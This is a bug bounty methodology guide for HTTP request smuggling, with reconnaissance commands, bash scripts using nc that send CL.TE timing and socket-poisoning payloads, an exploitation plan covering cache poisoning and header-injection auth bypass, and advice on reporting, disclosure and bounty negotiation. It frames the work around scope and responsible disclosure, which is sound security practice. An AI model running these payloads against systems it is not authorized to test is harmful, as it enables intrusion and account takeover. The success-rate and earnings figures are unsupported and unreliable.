# Methodology - Complete Request Smuggling Hunting Framework

Complete, step-by-step process for finding and exploiting request smuggling vulnerabilities professionally.

---

## Phase 1: Target Selection & Reconnaissance

### 1.1 High-Probability Targets

Request smuggling requires specific architecture:

**Priority 1 Targets:**
- ✅ Companies with CDN (CloudFlare, Akamai, AWS CloudFront)
- ✅ SaaS platforms (multiple backend nodes)
- ✅ Financial services (complex routing)
- ✅ API platforms (HTTP/2 frontend common)
- ✅ VPN/proxy services

**Skip These (low probability):**
- ❌ Single-server applications
- ❌ No reverse proxy/CDN
- ❌ HTTP/1.1 only (less attack surface)
- ❌ Connection: close enforced

### 1.2 Reconnaissance Steps

```bash
# Step 1: Check for reverse proxy indicators
curl -I https://target.com | grep -E "(Via|X-Forwarded|X-Cache|Age)"

# Expected indicators:
X-Forwarded-For: ...        ← Proxy detected
X-Cache: HIT                ← Caching layer
Via: 1.1 proxy              ← Explicit proxy
Age: 300                    ← Cache age = caching layer

# Step 2: Check HTTP/2 support
openssl s_client -connect target.com:443 -alpn h2,http/1.1

# Expected output:
ALPN, server accepted: h2   ← HTTP/2 frontend!

# Step 3: Check connection reuse
for i in {1..5}; do curl -w "@curl-format.txt" https://target.com; done
# Compare response times - if consistent = reused connection

# Step 4: Check for backend diversity
curl https://target.com
curl https://target.com  <- Check if response timing varies
curl https://target.com  <- Different backend served = load balancer

# Step 5: Query certificate transparency (find subdomains/backends)
curl "https://crt.sh/?q=%.target.com&output=json" | jq .

# Step 6: DNS enumeration
dig target.com ANY
nslookup target.com
```

### 1.3 Scoring Target

```
Points Needed: 15+ = Worth testing

[ ] Has reverse proxy / CDN          +5 points
[ ] HTTP/2 frontend                  +5 points
[ ] Connection reuse evident         +3 points
[ ] Caching layer present            +3 points
[ ] Multiple backend servers         +3 points
[ ] No obvious WAF/rate limiting     +2 points
[ ] In bug bounty program            +5 points

Score: _____ / 26 points
```

---

## Phase 2: Detection (Layer 1-3)

### 2.1 Quick Behavioral Tests (Layer 1)

**Time investment:** 5 minutes
**Outcome:** Pass/Fail to continue to Layer 2

```bash
# Test 1: Proxy header check
timeout 5 curl -I https://target.com | grep -q "X-Forwarded" && echo "PROXY=YES" || echo "PROXY=NO"

# Test 2: Connection reuse check  
timeout 5 curl -I https://target.com -H "Connection: keep-alive" | grep -i "keep-alive" && echo "REUSE=YES" || echo "REUSE=NO"

# Test 3: HTTP/2 check
timeout 5 openssl s_client -connect target.com:443 -alpn h2 2>&1 | grep "ALPN" | grep "h2" && echo "H2=YES" || echo "H2=NO"

# If ANY test fails: NOT VULNERABLE - skip target
# If ALL tests pass: Continue to Layer 2
```

### 2.2 Timing-Based Detection (Layer 2)

**Time investment:** 15 minutes per test
**Outcome:** Confidence score (0-40 points)

```bash
#!/bin/bash
# timing-test.sh

TARGET="$1"
PORT="${2:-443}"

echo "[*] CL.TE Timing Test..."
START=$(date +%s%3N)
timeout 10 bash -c "echo -ne 'POST / HTTP/1.1\r\nHost: $TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n1\r\nA\r\nX' | nc -w 1 $TARGET $PORT" > /dev/null 2>&1
END=$(date +%s%3N)
ELAPSED=$((END - START))

echo "Response time: ${ELAPSED}ms"

if [ $ELAPSED -gt 5000 ]; then
    echo "[+] CL.TE: LIKELY VULNERABLE (timeout > 5 seconds)"
    SCORE=30
elif [ $ELAPSED -gt 3000 ]; then
    echo "[~] CL.TE: Possible (timeout 3-5 seconds)"
    SCORE=15
else
    echo "[-] CL.TE: Not vulnerable (normal timing)"
    SCORE=0
fi

echo "Confidence Score: $SCORE/40"
```

**Interpretation:**
```
5+ seconds timeout = 30 points
3-5 seconds = 15 points
< 3 seconds = 0 points
```

### 2.3 Socket Poisoning Confirmation (Layer 3)

**Time investment:** 10-20 minutes
**Outcome:** Definitive proof (0-35 points)

```bash
#!/bin/bash
# socket-poisoning-test.sh

TARGET="$1"

echo "[*] Testing socket poisoning via 404 injection..."

# Create request with attack + victim payload
PAYLOAD=$(cat << 'EOF'
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
0

GET /does-not-exist-xyz HTTP/1.1
Host: TARGET

GET / HTTP/1.1
Host: TARGET

EOF
)

PAYLOAD="${PAYLOAD//TARGET/$TARGET}"

# Send both requests atomically
RESPONSE=$(echo "$PAYLOAD" | timeout 10 nc -w 2 $TARGET 80 2>&1)

# Check if 404 for our fake path appears in response
if echo "$RESPONSE" | grep -q "404\|Not Found"; then
    echo "[+] SOCKET POISONING CONFIRMED!"
    echo "[+] 404 injection successful - target is VULNERABLE"
    echo "Confidence Score: +35 points"
else
    echo "[-] No 404 in response - poisoning not confirmed"
    echo "Confidence Score: +0 points"
fi

echo ""
echo "Full Response:"
echo "$RESPONSE"
```

---

## Phase 3: Variant Identification

If Layer 1-3 passed, identify WHICH variant:

```
TESTING ORDER:

1. CL.TE (Most common, ~60% of cases)
   - Run Layer 2 timing test above
   
2. TE.CL (Second most common, ~25% of cases)
   - Similar to above but swap headers
   
3. TE.TE (Obfuscation required, ~10% of cases)
   - Requires testing multiple obfuscation variants
   
4. H2.CL (If HTTP/2 confirmed, ~4% of cases)
   - Use HTTP/2 aware tool
   
5. H2.TE (Rare, ~1% of cases)
   - Same as H2.CL but with TE
```

**Document which variant worked:**
- Enables better exploitation later
- Helps with bounty report clarity
- Determines mitigation difficulty

---

## Phase 4: Exploitation Planning

### 4.1 Determine Attack Vector

Based on target recon:

```
IF: Target has caching layer (CDN)
    → Exploit: Cache poisoning
    → Impact: CRITICAL (affects all users)

IF: Target has authentication requirement
    → Exploit: Auth bypass via header injection
    → Impact: CRITICAL (bypasses auth)

IF: Target has admin panel
    → Exploit: Direct admin access
    → Impact: CRITICAL (full compromise)

IF: Target handles credentials in responses
    → Exploit: Response queue poisoning
    → Impact: CRITICAL (credential theft)

IF: Uncertain what to attack
    → START: Header leakage (information gathering)
    → THEN: Plan next attack based on discovered headers
```

### 4.2 Exploitation Checklist

Before attempting any exploitation:

```
SAFETY CHECKS:
[ ] Confirmed vulnerability (Layer 1-3 passed)
[ ] In-scope for bounty program
[ ] Not already reported (search HackerOne)
[ ] Non-destructive attack plan
[ ] No real user data accessed
[ ] No production data modified

TECHNICAL CHECKS:
[ ] Payload syntax validated
[ ] Burp Repeater test performed
[ ] Timing measurements baseline
[ ] Backup plan if false positive

DOCUMENTATION CHECKS:
[ ] Screenshots/logs prepared to capture
[ ] Server logs accessible (or monitoring plan)
[ ] Network traffic capture ready
[ ] Timeline documented
```

### 4.3 Attack Sequence

```
SAFE ATTACK PROGRESSION:

1. Header Leakage (Read-only, safe)
   Send: GET / request via smuggle
   Capture: Internal headers, IPs, server info
   Risk: MINIMAL

2. Endpoint Discovery (Read-only, safe)
   Send: GET /admin, /api, /internal via smuggle
   Capture: Which endpoints exist
   Risk: MINIMAL

3. Differential Response (Proof, safe)
   Send: 404 injection
   Capture: Different error code
   Risk: MINIMAL

4. Auth Bypass Test (Limited scope, moderate risk)
   Send: Header injection (X-Forwarded-User: admin)
   Capture: Admin response
   Limit: Don't modify data yet
   Risk: MODERATE

5. Limited Exploitation (Contained, high risk)
   Send: Admin request
   Capture: Screenshot of access
   Limit: Only screenshot, no modifications
   Risk: HIGH

6. Full Exploitation (Only if necessary, critical risk)
   Send: Account modification request
   Capture: Proof of access
   Cleanup: Reverse modifications immediately
   Risk: CRITICAL
```

**NEVER skip steps. Each step validates vulnerability before proceeding.**

---

## Phase 5: Proof Generation

### 5.1 Required Evidence

For HIGH bounty, demonstrate:

```
REQUIREMENT 1: Technical Proof
✓ Screenshot showing timing delay (5+ seconds)
✓ Network traffic showing CL/TE headers
✓ Differential response (404 from injection)
✓ Repeatable (documented steps)

REQUIREMENT 2: Impact Demonstration
✓ Screenshot of admin panel access (if applicable)
✓ List of accessed data (without PII)
✓ Authentication bypass proof
✓ Affected users count

REQUIREMENT 3: Business Impact
✓ Estimated user impact
✓ Sensitive data at risk
✓ Compliance implications (if any)
✓ Attack complexity (easy/medium/hard)

REQUIREMENT 4: Reproducibility
✓ Step-by-step instructions
✓ Copy-paste ready payloads
✓ Expected results documented
✓ Success criteria clear
```

### 5.2 Screenshot Best Practices

```
GOOD SCREENSHOTS:
✓ Burp Repeater showing timing (7.2 seconds)
✓ Response tab showing 404 for injected request
✓ Network tab showing differentiation
✓ Server logs showing unauthorized access
✓ Admin dashboard accessed without login

BAD SCREENSHOTS:
❌ Admin panel without proof of unauthorized access
❌ Timing screenshot without clear timing indicator
❌ Blurry or unclear network traffic
❌ Screenshots with full PII visible
❌ No timestamp or context visible
```

### 5.3 Report Structure

```
EXECUTIVE SUMMARY (1 paragraph)
- Vulnerability type
- Impact level
- Attack complexity

TECHNICAL DESCRIPTION (2-3 paragraphs)
- Root cause explanation
- Why vulnerability exists
- Why standard defenses failed

PROOF OF CONCEPT (Step-by-step)
1. Open Burp Repeater
2. Send CL.TE request (payload: ...)
3. Observe 7.2 second timeout
4. Send differential response test
5. Receive 404 response
6. Send normal GET request
7. Observe normal request treated as second message

IMPACT ANALYSIS
- Who can exploit: Unauthenticated attacker
- Attack vector: Network (external)
- Who is affected: All users
- Damage potential: Full account takeover

REMEDIATION
- Immediate: Disable TE header
- Short-term: Normalize headers on both sides
- Long-term: Implement request/response synchronization
- Testing: Verify fix with payload above
```

---

## Phase 6: Responsible Disclosure

### 6.1 Submission Timeline

```
T+0: Vulnerability discovered
T+1 day: Document vulnerability completely
T+2 days: Prepare proof-of-concept
T+3 days: Test reproduction steps
T+4 days: Submit to vendor

T+5 days: Vendor acknowledges
T+30 days: Vendor patch released (expected)
T+45 days: Public disclosure

NEVER: Disclose publicly before vendor patch + timeline agreement
```

### 6.2 Submission Checklist

Before submitting to HackerOne/vendor:

```
CONTENT CHECKS:
[ ] Title is clear and specific
[ ] Vulnerability description < 500 words
[ ] Impact section demonstrates criticality
[ ] Proof of concept is reproducible (tested 3x)
[ ] No false claims in report
[ ] No exaggeration of impact
[ ] All statements technically accurate

EVIDENCE CHECKS:
[ ] Screenshots are clear and relevant
[ ] No sensitive data visible in screenshots
[ ] Timing clearly shown (not ambiguous)
[ ] Payload is exact and copy-paste ready
[ ] Steps can be followed sequentially

PROFESSIONALISM CHECKS:
[ ] No profanity or sarcasm
[ ] Professional tone throughout
[ ] Grammar/spelling checked
[ ] Links to references (CVEs, related research)
[ ] Proper formatting and structure

SECURITY CHECKS:
[ ] No PII included
[ ] No leaked credentials/tokens
[ ] No production data demonstrated
[ ] No account information visible
[ ] All cleanup completed
```

---

## Phase 7: Bounty Negotiation

### 7.1 If Bounty Seems Low

```
Email Template:

Subject: Re: Bounty Assessment for [Vulnerability ID]

Thank you for the bounty of $X. I respectfully believe this should be 
higher due to:

1. CVSS Score: 9.8 Critical (authentication bypass)
2. Affected Users: 100% of user base
3. Attack Complexity: Low (can be automated)
4. Proof of Impact: [Specific data accessed]
5. Comparable CVEs: [Link to similar CVE with higher bounty]

I'd appreciate reconsideration for bounty of $Y, which aligns with:
- Similar authentication bypass vulnerabilities
- Number of affected users
- Technical complexity of exploitation

Regards,
[Your Name]
```

### 7.2 Negotiation Strategy

```
NEVER:
❌ Demand specific amount
❌ Threaten public disclosure
❌ Compare to unrelated vulnerabilities
❌ Be aggressive or rude

INSTEAD:
✅ Present technical justification
✅ Reference similar bounties
✅ Focus on impact, not ego
✅ Remain professional
✅ Accept initial decision if reasonable
```

---

## Complete Workflow Diagram

```
START
  ↓
[Phase 1] Target Reconnaissance (15 min)
  ├─ Does target have proxy? NO → SKIP
  ├─ Does target have HTTP/2? Maybe → CONTINUE
  └─ Does target have keep-alive? YES → CONTINUE
  
  ↓
[Phase 2] Detection Testing (30 min)
  ├─ Layer 1: Behavioral tests → Score < 15? SKIP
  ├─ Layer 2: Timing tests (5+ sec?) → NO? SKIP
  └─ Layer 3: Socket poisoning → Confirmed? CONTINUE
  
  ↓
[Phase 3] Variant ID (15 min)
  ├─ Test CL.TE → Works? Note it
  ├─ Test TE.CL → Works? Note it
  └─ Test variants → Document which
  
  ↓
[Phase 4] Exploitation Planning (30 min)
  ├─ Determine attack vector
  ├─ Check safety conditions
  └─ Plan attack sequence
  
  ↓
[Phase 5] Proof Generation (60 min)
  ├─ Execute attacks
  ├─ Capture evidence
  ├─ Document steps
  └─ Validate reproducibility
  
  ↓
[Phase 6] Report Preparation (45 min)
  ├─ Write technical description
  ├─ Prepare proof-of-concept
  ├─ Review impact analysis
  └─ Final quality check
  
  ↓
[Phase 7] Submission & Follow-up
  ├─ Submit to HackerOne/vendor
  ├─ Monitor for response
  ├─ Provide clarifications as needed
  └─ Negotiate bounty if necessary
  
  ↓
END (Bounty received!)
```

---

## Time Estimates

```
Quick Target (straightforward vulnerability):
- Reconnaissance: 10 min
- Detection: 15 min
- Exploitation: 20 min
- Documentation: 15 min
TOTAL: 60 minutes → $5,000-15,000 bounty

Complex Target (multiple techniques needed):
- Reconnaissance: 30 min
- Detection: 45 min
- Variant testing: 45 min
- Exploitation: 90 min
- Documentation: 60 min
TOTAL: 4.5 hours → $15,000-50,000 bounty
```

**ROI: $2,000-3,000+ per hour of work**

